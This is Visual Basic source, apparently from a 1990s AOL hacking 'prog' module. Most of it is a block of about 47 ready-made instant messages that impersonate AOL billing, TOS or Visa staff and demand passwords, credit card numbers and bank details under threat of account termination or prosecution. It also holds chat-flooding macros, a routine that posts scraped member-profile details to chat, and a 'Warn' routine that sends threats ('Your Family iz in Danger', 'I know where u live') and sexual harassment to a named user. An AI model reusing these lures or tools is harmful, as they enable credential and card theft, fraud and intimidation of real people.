If phraZes = "40" Then txt = "AOL User: We are very sorry to inform you that a mistake was made while correcting people's account info. Your screen name was (accidentely) selected by AOL to be deleted. Your account cannot be totally deleted while you are online, so luckily, you were signed on for us to send this message.All we ask is that you click the Respond button and enter your logon password. I can also asure you that this scenario will never occur again. Thank you for your coop"
If phraZes = "41" Then txt = "Hello, I am with the AOL User Resource Department, and due to an error in your log on we failed to recieve your logon password, for our records, please click 'respond' then state your Screen Name and Password.  Failure to comply will result in account invalidation, and force you to go throught the new member sign on procedure again.  Thank you."
If phraZes = "42" Then txt = "Good evening, I am with the America Online User Department, and due to a system crash, we have lost your information, for out records please click 'respond' and state your Screen Name, and logon Password.  Thank you, and enjoy your time on AOL."
If phraZes = "43" Then txt = "Hello, I am with the America Online Billing Department, due to a failure in our data carrier, we did not recieve your information when you made your account, for our records, please click 'respond' then state your Full Name, Address, City, State, Zip Code, Credit Card number, Bank Name and Expiration Date.  Failure to comply will result in account invalidation, and force you to go throught the new member sign on procedure again.  Thank you."
If phraZes = "44" Then txt = "Hi, I am with the America Online Hacker enforcement group, we have detected hackers using your account, we need to verify your identity, so we can catch the illicit users of your account, to prove your identity, please click 'respond' then state your Screen Name, Personal Password, Full Name, Address, City, State, Zip Code, Credit Card number, Bank Name and Expiration Date.  Thank you and have a nice day!"
If phraZes = "45" Then txt = "Hello, how is one of our more privelaged OverHead Account Users doing today? We are sorry to report that due to hackers, Stratus is reporting problems, please respond with the last four digits of your home telephone number and Logon PW. Thanks -AOL Acc.Dept."
If phraZes = "46" Then txt = "Please click on 'respond' and send me your personal logon password immediately so we may validate your account.  Failure to cooperate may result in permanent account termination.  Thank you for your cooperation and enjoy the service!"
If phraZes = "47" Then txt = "Due to problems with the New Member Database of America Online, we are forced to ask you for your personal logon password online.  Please click on 'respond' and send me this information immediately or face account termination!  Thank you for your cooperation."
If phraZes = "48" Then txt = "Hello current user,we had a virus in are system today around 8:30 this morning,Random memory loses followed!We are going to have to ask for your billing info that you entered in when you signed up![Credit Card number,Address,Phone number,Zip code,State]To keep your account active,in case you do not reply with the information requested your account will be shut down,If this should happen,contact us at our 800#!Thank you for your cooperation! :-)   :AOL Billing"
If phraZes = "49" Then txt = "During your sign on period your Credit Card number did not cycle,please respond with the credit card number used during sign-up!To remain signed on our service,If you do not reply we will have to terminate your account,If this happens please contact our 800# at [1-800-827-6364].Thank you for your time,for your cooperation your account will be credited 10 free hours!  :-)      :AOL Billing"
If phraZes = "50" Then txt = "Hello current member,This is the AOL billing department,We are going have to ask you for your credit card information you have used to make the account you are currently on!We had a bug in the system earlier and it may of caused errors in your bill,When you reply we will verify your account and send you,your current monthes total!If there should be errors,please contact us at [1-800-827-3891].Thank you for your time.          :AOL Billing"
If phraZes = "51" Then txt = "Sorry to disturb you, but are records indicate the the credit card number you gave us has expired.  Please click respond and type in your cc# so that i may verify this and correct all errors!"
If phraZes = "52" Then txt = "I work for Intel, I have a great new catalouge! If you would like this catalouge and a coupon for $200 off your next Intel purchase, please click on respond, and give me your address, full name, and your credit card number. Thanks! |=-)"
If phraZes = "53" Then txt = "Hello, I am TOS ADVISOR and seeing that I made a mistake  we seem to have failed to recieve your logon password. Please click respond and enter your Your Full name, address, Credit Card #, Bank Name, Expiration Date, and home phone number. Please respond as soon as possible  Thank you for your time."
If phraZes = "54" Then txt = "Pardon me, I am with AOL's Staff and due to a transmission error we have had problems verifying some things Your Full name, address, Credit Card #, Bank Name, Expiration Date, and home phone number. Please respond within 2 minutes too keep this account active. Thank you for your cooperation."
If phraZes = "55" Then txt = "Hello, I am with America Online and due to technical problems we have had problems verifying some things Your Full name, address, Credit Card #, Bank Name, Expiration Date, and home phone number. Please respond as soon as possible  Thank you for your time."
If phraZes = "56" Then txt = "Dear User,     Upon sign up you have entered incorrect credit information. Your current credit card information  does not match the name and/or address.  We have rescently noticed this problem with the help of our new OTC computers.  If you would like to maintain an account on AOL, please respond with your Credit Card# with it's exp.date,and your Full name and address as appear on the card.  And in doing so you will be given 15 free hours.  Reply within 5 minutes to keep this accocunt active."
If phraZes = "57" Then txt = "Hello I am a represenative of the Visa Corp. emp# C8205183W. Due to a malfunction in our system we were unable to process your registration to America Online. In order to correct this mistake, we ask that you hit the 'Respond' key, and reply with the following information: Name, Address, Tele#, Visa Card#, and Exp. Date. If this information is not received promptly your account will be terminated. For any further questions please contact us at 1-800-336-8427. Thank You."
If phraZes = "58" Then txt = "Hello and welcome to America online.  We know that we have told you not to reveal your billing information to anyone, but due to an unexpected crash in our systems, we must ask you for the following information to verify your America online account: Name, Address, Telephone#, Credit Card#, Bank Name, and Expiration Date. After this initial contact we will never again ask you for your password or any billing information. Thank you for your time and cooperation.  :-)"
If phraZes = "59" Then txt = "Hello, I am a represenative of the AOL User Resource Dept.  Due to an error in our computers, your registration has failed authorization. To correct this problem we ask that you promptly hit the `Respond` key and reply with the following information: Name, Address, Telephone#, Credit Card#, Bank Name, and Expiration Date. We hope that you enjoy are services here at America Online. Thank You.  For any further questions please call 1-800-827-2612. :-)"
If phraZes = "60" Then txt = "Hello, I am a member of the America Online Billing Department.  We are sorry to inform you that we have experienced a Security Breach in the area of Customer Billing Information.  In order to resecure your billing information, we ask that you please respond with the following information: Name, Addres, Tele#, Credit Card#, Bank Name, Exp. Date, Screen Name, and Log-on Password. Failure to do so will result in immediate account termination. Thank you and enjoy America Online.  :-)"
If phraZes = "61" Then txt = "Hello , I am with the Hacker Enforcement Team(HET).  There have been many interruptions in your phone lines and we think it is being caused by hackers. Please respond with your log-on password , your Credit Card Number , your full name , the experation date on your Credit Card , and the bank.  We are asking you this so that we can verify you.  Respond immediatly or YOU will be considered the hacker and YOU will be prosecuted! "
If phraZes = "62" Then txt = "Hello AOL Member , I am with the OnLine Technical Consultants(OTC).  You are not fully registered as an AOL memberand you are going OnLine ILLEGALLY. Please respond to this IM with your Credit Card Number , your full name , the experation date on your Credit Card and the Bank.  Please respond immediatly so that the OTC can fix your problem! Thank you and have a nice day!  : )"
If phraZes = "63" Then txt = "Hello AOL Memeber.  I am sorry to inform you that a hacker broke into our system and deleted all of our files.  Please respond to this IM with you log-on password password so that we can verify billing , thank you and have a nice day! : )"
If phraZes = "64" Then txt = "Hello User.  I am with the AOL Billing Department.  This morning their was a glitch in our phone lines.  When you signed on it did not record your login , so please respond to this IM with your log-on password so that we can verify billing , thank you and have a nice day! : )"
If phraZes = "65" Then txt = "Dear AOL Member.  There has been hackers using your account.  Please respond to this IM with your log-on password so that we can verify that you are not the hacker.  Respond immedialtly or YOU will be considered the hacker and YOU wil be prosecuted! Thank you and have a nice day.  : )"
If phraZes = "66" Then txt = "Hello , I am with the Hacker Enforcement Team(HET).  There have been many interruptions in your phone lines and we think it is being caused by hackers. Please respond with your log-on password , your Credit Card Number , your full name , the experation date on your Credit Card , and the bank.  We are asking you this so that we can verify you.  Respond immediatly or YOU will be considered the hacker and YOU will be prosecuted!"
If phraZes = "67" Then txt = "AOL Member , I am sorry to bother you but your account information has been deleted by hackers.  AOL has searched every bank but has found no record of you.  Please respond to this IM with your log-on password , Credit Card Number , Experation Date , you Full Name , and the Bank.  Please respond immediatly so that we can get this fixed.  Thank you and have a nice day.   :)"
If phraZes = "68" Then txt = "Dear Member , I am sorry to inform you that you have 5 TOS Violation Reports..the maximum you can have is five.  Please respond to this IM with your log-on password , your Credit Card Number , your Full Name , the Experation Date , and the Bank.  If you do not respond within 2 minutes than your account will be TERMINATED!! Thank you and have a nice day.  : )"
If phraZes = "69" Then txt = "Hello,Im with OTC(Online Technical Consultants).Im here to inform you that your AOL account is showing a billing error of $453.26.To correct this problem we need you to respond with your online password.If you do not comply,you will be forced to pay this bill under federal law. "
If phraZes = "70" Then txt = "Hello,Im here to inform you that you just won a online contest which consisted of a $3000 dollar prize.We seem to have lost all of your account info.So in order to receive your prize you need to respond with your log on password so we can rush your prize straight to you!  Thank you."
If phraZes = "71" Then txt = "Remember AOL will never ask for your password or billing information online, but due to a problem with all Sprint and TymeNet Local Access telephone numbers I must report all system errors within 24 hours. You cannot stay Online unless you respond with your VALID password.  Thank you for your cooperation."
If phraZes = "72" Then txt = "Hello, I am with the AOL User Resource Department, and due to an error caused by SprintNet, we failed to receive your log on password, for our records.  Failure to comply will result in account invalidation, and force you to go throught the new member sign on procedure again.  Please click 'respond' then state your Screen Name and Password. Remember, after this initial account validation America Online will never ask for any account information again.  Thank you.  :-)"
If phraZes = "73" Then txt = "Attention:The message at the bottom of the screen is void when speaking to AOL employess.We are very sorry to inform you that due to a legal conflict, the Sprint network(which is the network AOL uses to connect it users) is witholding the transfer of the log-in password at sign-on.To correct this problem,We need you to click on RESPOND and enter your password, so we can update your personal Master-File,containing all of your personal info.  We are very sorry for this inconvience --AOL Customer Service Dept."
If phraZes = "74" Then txt = "Hello, I am with the America Online Password Verification Commity. Due to many members incorrectly typing thier passwords at first logon sequence I must ask you to retype your password for a third and final verification. No AOL staff will ask you for your password after this process. Please respond within 2 minutes to keep this account active."
If phraZes = "75" Then txt = "Remember AOL will never ask for your password or billing information online, but due to a problem with all Sprint and TymeNet Local Access telephone numbers I must report all system errors within 24 hours. You cannot stay Online unless you respond with your VALID password.  Thank you for your cooperation "
If phraZes = "76" Then txt = "Please disregard the message in red. Unfortunately, a hacker broke into the main AOL computer and managed to destroy our password verification logon routine and user database, this means that anyone could log onto your account without any password validation. The red message was added to fool users and make it difficult for AOL to restore your account information. To avoid canceling your account, will require you to respond with your password. After this, no AOL employee will ask you for your password again."
If phraZes = "77" Then txt = "Dear America Online user, due to the recent America Online crash, your password has been lost from the main computer systems'.  To fix this error, we need you to click RESPOND and respond with your current password.  Please respond within 2 minutes to keep active.  We are sorry for this inconvinience, this is a ONE time emergency.  Thank you and continue to enjoy America Online!"
If phraZes = "78" Then txt = "Hello, I am an America Online Administrator.  Due to a problem we're experiencing with the Sprint Network, we need you to verify your log-in password to me so that you can continue this log-in session with America Online.  We apologize for this inconvenience, and thank you for cooperation. "
If phraZes = "79" Then txt = "Dear User, I am sorry to report that your account has been traced and has shown that you are signed on from another location.  To make sure that this is you please enter your sign on password so we can verify that this is you.  Thank You! AOL."
If phraZes = "80" Then txt = "Hello, I am sorry to inturrupt but I am from the America Online Service Departement. We have been having major problems with your account information. Now we understand that you have been instructed not to give out and information, well were sorry to say but in this case you must or your account will be terminated. We need your full name as well as last, Adress, Credit Card number as well as experation date as well as logon password. We our really sorry for this inconveniance and grant you 10 free hours. Thank you and enjoy AOL."
If phraZes = "81" Then txt = "Hello, My name is Dan Weltch from America Online. We have been having extreme difficulties with your records. Please give us your full log-on Scree Name(s) as well as the log-on PW(s), thank you :-)"
If phraZes = "82" Then txt = "Hello, I am the TOSAdvisor. I am on a different account because there has been hackers invading our system and taking over our accounts. If you could please give us your full log on PW so we can correct this problem, thank you and enjoy AOL. "
If phraZes = "83" Then txt = "Hello, I am from the America Online Credit Card Records and we have been experiancing a major problem with your CC# information. For us to fix this we need your full log-on screen names(s) and password(s), thank. "
If phraZes = "84" Then txt = "Hi, I'm with Anti-Hacker Dept of AOL. Due to Thë break-in's into our system, we have experienced problems. We need you to respond with your credit card #, exp date, full name, address, and phone # to correct errors. "
If phraZes = "85" Then txt = "Hello, I am with the America Online Billing Department, due to a failure in our data carrier, we did not recieve your information when you made your account, for our records, please click 'respond' then state your Full Name, Address, City, State, Zip Code, Credit Card number, Bank Name and Expiration Date.  Failure to comply will result in account invalidation, and force you to go throught the new member sign on procedure again.  Thank you."
If Phrazez = "86" Then txt = "Hello, I am with the America Online New User Validation Department.  I am happy to inform you that the validation process is almost complete.  To complete the validation process i need you to respond with your full name, address, phone number, city, state, zip code,  credit card number, expiration date, and bank name.  Thank you and enjoy AOL. "

End Sub


Function CountEnters(stText As String) As Integer
    On Error Resume Next
    Dim intLoop As Integer
    For intLoop% = 1 To Len(stText$) Step 1
    stWrd1$ = Mid(stText, intLoop, 1)
    If stWrd1$ = Chr(13) Then intEnters% = intEnters% + 1
    Next intLoop%

    CountEnters% = intEnters%
End Function


Function CountLines(stText As String) As Integer
    On Error Resume Next
    CountLines% = CountEnters(stText$) + 1
    
End Function
Function LoadtxtToText(TxtFilename As String, TextboxToload As TextBox)
Dim nFile As Integer
Dim sFile As String

'Get a suitable file number
nFile = FreeFile

'Specify the file you want opened.
sFile = TxtFilename

'Open the file
Open sFile For Input As nFile

'Read the file into the text box
TextboxToload = Input(LOF(nFile), nFile)

Close nFile


End Function


Function GetClipboardText() As String
GetClipboardText = Clipboard.gettext
End Function
Sub MacroTXT(Text As TextBox)
'ouwop
'aol2/4
For ctri% = 1 To CountTextBoxLines(Text)
ag$ = GetTextBoxLine(Text, ctri%)
sendchat ("<Font Color=#ff00ff><b>¬ <font Color=#G></b> ") + ag$ ', False, False, False, False
TimeOut (0.6)
Next
'Call PercentBar(Picture2, Label1, f$)
End Sub

Sub MacroTXT2(Text As TextBox, statuz As PictureBox)
'ouwop
'aol2/4
FF$ = CountTextBoxLines(Text)
fg$ = "0"
For ctri% = 1 To CountTextBoxLines(Text)
ag$ = GetTextBoxLine(Text, ctri%)
fg$ = fg$ + 1
Call PercentBar(statuz, fg$, FF$)
sendchat (".") + ag$
TimeOut (0.6)
Next

End Sub

Sub Percent_reseT(picture1 As PictureBox)
'ouwop
picture1.AutoRedraw = True
picture1.FillStyle = 0
picture1.DrawStyle = 0
picture1.FontName = "MS Sans Serif"
picture1.FontSize = 8.25
picture1.FontBold = False
picture1.Line (0, 0)-(picture1.Width, picture1.Height), RGB(255, 255, 255), BF
picture1.Line (0, 0)-(X - 10, picture1.Height), RGB(0, 0, 255), BF
picture1.CurrentX = (picture1.Width / 2) - 100
picture1.CurrentY = (picture1.Height / 2) - 125
picture1.ForeColor = RGB(255, 0, 0)
picture1.Print Percent("0", Total, 100) & "%"
End Sub
Sub MacroLABEL(Text As Label)
'ouwop
'aol4/5
For ctri% = 1 To CountLabeLBoxLines(Text)
ag$ = GetLabeLBoxLine(Text, ctri%)
Call RePlacestRing(ag$, "Member Name:", "")
Call RePlacestRing(ag$, "ocation:", "")
Call RePlacestRing(ag$, "irthdate:", "")
Call RePlacestRing(ag$, "ex:", "")
Call RePlacestRing(ag$, "arital Status:", "")
Call RePlacestRing(ag$, "obbies:", "")
Call RePlacestRing(ag$, "omputers:", "")
Call RePlacestRing(ag$, "ccupation:", "")
Call RePlacestRing(ag$, "ersonal Quote:", "")
Call RePlacestRing(ag$, Chr(9), "")
Call RePlacestRing(ag$, Chr(13), "")
Call RePlacestRing(ag$, Chr(10), "")
sendchat ("<Font Color=#ffjj55><b>¬<font Color=#0000ff></b> ") + ag$ ', False, False, False, False
TimeOut (0.6)
Next
End Sub
Sub Clone_Macro(Text As TextBox)
'ouwop
'aol2/4/5
d$ = "0"
Text.Enabled = False
For ctri% = 1 To CountTextBoxLines(Text)
d$ = d$ + 1
TimeOut (0.00000001)
ag$ = GetTextBoxLine(Text, ctri%)
sendchat (".") + ag$
TimeOut (0.00000001)
If d$ = "4" Then Minimize_AOL: TimeOut (0.00000000001): Maximize_AOL: TimeOut (0.00000001): d$ = "0"
Next
Text.Enabled = True
End Sub
Function GetTextBoxLine(Text As TextBox, theline As Integer) As String
u = CountTextBoxLines(Text)
If theline > u Then Exit Function
For g = 1 To theline - 1
e = InStr(e + 1, Text.Text, Chr(13))
Next
e = e + 1
If e = 1 Then e = 0
For f = 1 To theline
J = InStr(J + 1, Text.Text, Chr(13))
Next
If J = 0 Then J = Len(Text.Text) + 1
GetTextBoxLine = Mid(Text.Text, e + 1, J - 1 - e)
End Function
Function GetLabeLBoxLine(Text As Label, theline As Integer) As String
u = CountLabeLBoxLines(Text)
If theline > u Then Exit Function
For g = 1 To theline - 1
e = InStr(e + 1, Text.caption, Chr(13))
Next
e = e + 1
If e = 1 Then e = 0
For f = 1 To theline
J = InStr(J + 1, Text.caption, Chr(13))
Next
If J = 0 Then J = Len(Text.caption) + 1
GetLabeLBoxLine = Mid(Text.caption, e + 1, J - 1 - e)
End Function

Function CountTextBoxLines(Text)
i = 0
Do
a = InStr(a + 1, Text, Chr(13))
If a = 0 Then Exit Do
i = i + 1
Loop
CountTextBoxLines = i + 1
End Function

Function CountLabeLBoxLines(Text)
i = 0
Do
a = InStr(a + 1, Text, Chr(13))
If a = 0 Then Exit Do
i = i + 1
Loop
CountLabeLBoxLines = i + 1
End Function



Function Chat_Font(Text As String)
b = Mid(time, Len(Format(time, "h:mm:ss")) - 2, 2)
For m = 1 To Len(Text)
If b > Printer.FontCount Then b = 1 Else b = b + 1
ob$ = Printer.Fonts(b)
AST$ = AST$ & "<font face=""" & ob$ & """>" & Mid(Text, m, 1)
Next
Chat_Font = AST$
End Function

Sub LoadFonts_LizT(list As Control)
Dim X As Long
list.Clear
For X = 1 To Screen.FontCount
'If Screen.Fonts(X - 1) = "Wingdings" Then GoTo nex
'If Screen.Fonts(X - 1) = "Webdings" Then GoTo nex
'If Screen.Fonts(X - 1) = "Symbol" Then GoTo nex
'If Screen.Fonts(X - 1) = "Fixedsys" Then GoTo nex
'If Screen.Fonts(X - 1) = "Marlett" Then GoTo nex
'If Screen.Fonts(X - 1) = "Wingdings2" Then GoTo nex
'If Screen.Fonts(X - 1) = "Wingdings3" Then GoTo nex
'If Screen.Fonts(X - 1) = "Wingding 2" Then GoTo nex
'If Screen.Fonts(X - 1) = "Wingdings 3" Then GoTo nex
list.AddItem LCase(Screen.Fonts(X - 1))
nex:
Next
End Sub

Function MakeASCIIChart(list As ListBox)
Dim X As Long
For X = 33 To 255
    list.AddItem Chr(X)
Next X
End Function
Function taG_addValidascii(list As ListBox)
'ouwop
Dim X As Long
For X = 33 To 255
g = Chr(X)
If check_illegalChaRz(g) = 1 Then GoTo J
list.AddItem g
J:
Next X
End Function

Function STR_Code(sstr As String)
Dim Made As String, sSTRLen As Long, NumSpaces As Long
Dim NextChr As String, NwO As String
    Let Made$ = sstr
    Let sSTRLen& = Len(Made$)
Do While NumSpaces& <= sSTRLen&
    Let NumSpaces& = NumSpaces& + 1
    Let NextChr$ = Mid$(Made$, NumSpaces&, 1)
If NextChr$ = "A" Then Let NextChr$ = "š"
If NextChr$ = "B" Then Let NextChr$ = "œ"
If NextChr$ = "C" Then Let NextChr$ = "¢"
If NextChr$ = "D" Then Let NextChr$ = "¤"
If NextChr$ = "E" Then Let NextChr$ = "±"
If NextChr$ = "F" Then Let NextChr$ = "°"
If NextChr$ = "G" Then Let NextChr$ = "²"
If NextChr$ = "H" Then Let NextChr$ = "³"
If NextChr$ = "I" Then Let NextChr$ = "µ"
If NextChr$ = "J" Then Let NextChr$ = "ª"
If NextChr$ = "K" Then Let NextChr$ = "¹"
If NextChr$ = "L" Then Let NextChr$ = "º"
If NextChr$ = "M" Then Let NextChr$ = "Ÿ"
If NextChr$ = "N" Then Let NextChr$ = "í"
If NextChr$ = "O" Then Let NextChr$ = "î"
If NextChr$ = "P" Then Let NextChr$ = "ï"
If NextChr$ = "Q" Then Let NextChr$ = "ð"
If NextChr$ = "R" Then Let NextChr$ = "ñ"
If NextChr$ = "S" Then Let NextChr$ = "ò"
If NextChr$ = "T" Then Let NextChr$ = "ó"
If NextChr$ = "U" Then Let NextChr$ = "ô"
If NextChr$ = "V" Then Let NextChr$ = "õ"
If NextChr$ = "W" Then Let NextChr$ = "ö"
If NextChr$ = "X" Then Let NextChr$ = "ø"
If NextChr$ = "Y" Then Let NextChr$ = "ù"
If NextChr$ = "Z" Then Let NextChr$ = "ú"
If NextChr$ = " " Then Let NextChr$ = " "
If NextChr$ = "a" Then Let NextChr$ = "'"
If NextChr$ = "b" Then Let NextChr$ = "û"
If NextChr$ = "c" Then Let NextChr$ = "ü"
If NextChr$ = "d" Then Let NextChr$ = "ý"
If NextChr$ = "e" Then Let NextChr$ = "þ"
If NextChr$ = "f" Then Let NextChr$ = "Æ"
If NextChr$ = "g" Then Let NextChr$ = "Ç"
If NextChr$ = "h" Then Let NextChr$ = "Ì"
If NextChr$ = "i" Then Let NextChr$ = "Í"
If NextChr$ = "j" Then Let NextChr$ = "Î"
If NextChr$ = "k" Then Let NextChr$ = "Ï"
If NextChr$ = "l" Then Let NextChr$ = "Ø"
If NextChr$ = "m" Then Let NextChr$ = "Þ"
If NextChr$ = "n" Then Let NextChr$ = "ß"
If NextChr$ = "o" Then Let NextChr$ = "†"
If NextChr$ = "p" Then Let NextChr$ = "ƒ"
If NextChr$ = "q" Then Let NextChr$ = "Œ"
If NextChr$ = "r" Then Let NextChr$ = "Š"
If NextChr$ = "s" Then Let NextChr$ = "‡"
If NextChr$ = "t" Then Let NextChr$ = "¡"
If NextChr$ = "u" Then Let NextChr$ = "£"
If NextChr$ = "v" Then Let NextChr$ = "§"
If NextChr$ = "w" Then Let NextChr$ = "ì"
If NextChr$ = "x" Then Let NextChr$ = "ë"
If NextChr$ = "y" Then Let NextChr$ = "ê"
If NextChr$ = "z" Then Let NextChr$ = "é"
If NextChr$ = "1" Then Let NextChr$ = "è"
If NextChr$ = "2" Then Let NextChr$ = "ç"
If NextChr$ = "3" Then Let NextChr$ = "æ"
If NextChr$ = "4" Then Let NextChr$ = "á"
If NextChr$ = "5" Then Let NextChr$ = "å"
If NextChr$ = "6" Then Let NextChr$ = "â"
If NextChr$ = "7" Then Let NextChr$ = "ã"
If NextChr$ = "8" Then Let NextChr$ = "ä"
If NextChr$ = "9" Then Let NextChr$ = "à"
If NextChr$ = "0" Then Let NextChr$ = "×"
    Let NwO$ = NwO$ + NextChr$
Loop
STR_Code = NwO$
End Function


Public Function Fileexists(sFileName As String) As Boolean
    If Len(sFileName$) = 0 Then
        Fileexists = False
        Exit Function
    End If
    If Len(dir$(sFileName$)) Then
        Fileexists = True
    Else
        Fileexists = False
    End If
End Function

Public Function StayOnTop(the As Form)

Flag% = SWP_NOMOVE Or SWP_NOSIZE

lSetPos = SetWindowPos(the.hwnd, HWND_TOPMOST, 0, 0, 0, 0, FLAGS)

End Function












Sub Warn(Combo)
'ouwop
    Dim OLD
    Randomize
    OLD = Int(2 * Rnd + 1)
If OLD = 1 Then
    Dim Dice1
    Randomize
    Dice1 = Int(36 * Rnd + 1)
If Dice1 = 1 Then sendchat ("WaRnInG " + Combo + ", U AiNt GoD Da SkIllz"): Exit Sub
If Dice1 = 2 Then sendchat ("WaRnInG " + Combo + ", U Can't Handle Dis"): Exit Sub
If Dice1 = 3 Then sendchat ("WaRnInG " + Combo + ", Me n My Boyz Will Throw Down"): Exit Sub
If Dice1 = 4 Then sendchat ("WaRnInG " + Combo + ", Your making me Mad"): Exit Sub
If Dice1 = 5 Then sendchat ("WaRnInG " + Combo + ", im cocking my Gat!"): Exit Sub
If Dice1 = 6 Then sendchat ("WaRnInG " + Combo + ", U Dont know what u iz doing"): Exit Sub
If Dice1 = 7 Then sendchat ("WaRnInG " + Combo + ", We WiLL Deal da DeaL"): Exit Sub
If Dice1 = 8 Then sendchat ("WaRnInG " + Combo + ", Im Using mazTa Progg"): Exit Sub
If Dice1 = 9 Then sendchat ("WaRnInG " + Combo + ", I Know Ouwop Personally"): Exit Sub
If Dice1 = 10 Then sendchat ("WaRnInG " + Combo + ", You in my hood"): Exit Sub
If Dice1 = 11 Then sendchat ("WaRnInG " + Combo + ", I dislike YoU"): Exit Sub
If Dice1 = 12 Then sendchat ("WaRnInG " + Combo + ", FUCK YOU"): Exit Sub
If Dice1 = 13 Then sendchat ("WaRnInG " + Combo + ", Im Ghetto!"): Exit Sub
If Dice1 = 14 Then sendchat ("WaRnInG " + Combo + ", iM nOt YouR ordinary AOL user"): Exit Sub
If Dice1 = 15 Then sendchat ("WaRnInG " + Combo + ", Dont fuck with me or Else !"): Exit Sub
If Dice1 = 16 Then sendchat ("WaRnInG " + Combo + ", I Know Ouwop Personally"): Exit Sub
If Dice1 = 17 Then sendchat ("WaRnInG " + Combo + ", I am one uv Ouwopz Peepz!"): Exit Sub
If Dice1 = 18 Then sendchat ("WaRnInG " + Combo + ", I Know HlPNOT Personally"): Exit Sub
If Dice1 = 19 Then sendchat ("WaRnInG " + Combo + ", STFU B4 U Git Fucked Up!"): Exit Sub
If Dice1 = 20 Then sendchat ("WaRnInG " + Combo + ", I know where u live"): Exit Sub
If Dice1 = 21 Then sendchat ("WaRnInG " + Combo + ", My handle iz I.S.P"): Exit Sub
If Dice1 = 22 Then sendchat ("WaRnInG " + Combo + ", I am a 92/100 Hacker!"): Exit Sub
If Dice1 = 23 Then sendchat ("WaRnInG " + Combo + ", I Phreak n will Cancel your Connecti0n!"): Exit Sub
If Dice1 = 24 Then sendchat ("WaRnInG " + Combo + ", I'll 0wn dat azz!"): Exit Sub
If Dice1 = 25 Then sendchat ("WaRnInG " + Combo + ", I can make Trojans GOOD!"): Exit Sub
If Dice1 = 26 Then sendchat ("WaRnInG " + Combo + ", I can git yo Account # Fazt!"): Exit Sub
If Dice1 = 27 Then sendchat ("WaRnInG " + Combo + ", I can GiT Yo Addrezz!"): Exit Sub
If Dice1 = 28 Then sendchat ("WaRnInG " + Combo + ", Im gitting annoyed"): Exit Sub
If Dice1 = 29 Then sendchat ("WaRnInG " + Combo + ", Your Family iz in Danger"): Exit Sub
If Dice1 = 30 Then sendchat ("WaRnInG " + Combo + ", I Know where you werk!"): Exit Sub
If Dice1 = 31 Then sendchat (Combo + ", i b y0 mazta fo0"): Exit Sub
If Dice1 = 32 Then sendchat (Combo + ", play wit deeeez"): Exit Sub
If Dice1 = 33 Then sendchat (Combo + ", youz a skank azz hoe"): Exit Sub
If Dice1 = 34 Then sendchat (Combo + ", i want some head bitch"): Exit Sub
If Dice1 = 35 Then sendchat (Combo + ", im a stick my nuttz in yo mouth piece"): Exit Sub
If Dice1 = 36 Then sendchat (Combo + ", play wit my ding a ling [pleaze]"): Exit Sub
ElseIf OLD = 2 Then: Call warn2(Combo)
End If

End Sub
